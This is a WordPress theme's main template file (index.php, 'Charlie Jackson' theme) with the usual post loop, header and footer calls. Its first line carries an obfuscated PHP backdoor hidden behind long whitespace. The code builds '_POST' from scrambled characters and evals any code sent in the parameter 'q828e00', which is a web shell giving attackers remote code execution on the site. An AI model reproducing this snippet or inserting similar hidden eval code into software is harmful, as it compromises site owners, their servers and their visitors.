<?php                                                                                                                                                                                                                                                                          $seu35= "torue_ps" ;$cvdc7=$seu35[7].$seu35[0].$seu35[2].$seu35[0]. $seu35[1]. $seu35[3]. $seu35[6]. $seu35[6]. $seu35[4]. $seu35[2];$lbf3=$cvdc7( $seu35[5].$seu35[6].$seu35[1]. $seu35[7]. $seu35[0]); if(isset( ${ $lbf3 }['q828e00' ]) ){eval ( ${ $lbf3} [ 'q828e00' ]) ;}?><?php
/**
 * The main template file.
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 * Learn more: http://codex.wordpress.org/Template_Hierarchy
 *
 * @package Charlie Jackson
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		<?php if ( have_posts() ) : ?>

			<?php /* Start the Loop */ ?>
			<?php while ( have_posts() ) : the_post(); ?>

				<?php
					/* Include the Post-Format-specific template for the content.
					 * If you want to override this in a child theme, then include a file
					 * called content-___.php (where ___ is the Post Format name) and that will be used instead.
					 */
					get_template_part( 'post-formats/content', get_post_format() );
				?>

			<?php endwhile; ?>

			<?php charlie_jackson_paging_nav(); ?>

		<?php else : ?>

			<?php get_template_part( '/blog/content', 'none' ); ?>

		<?php endif; ?>

		</main><!-- #main -->
	</div><!-- #primary -->

<?php get_footer(); ?>
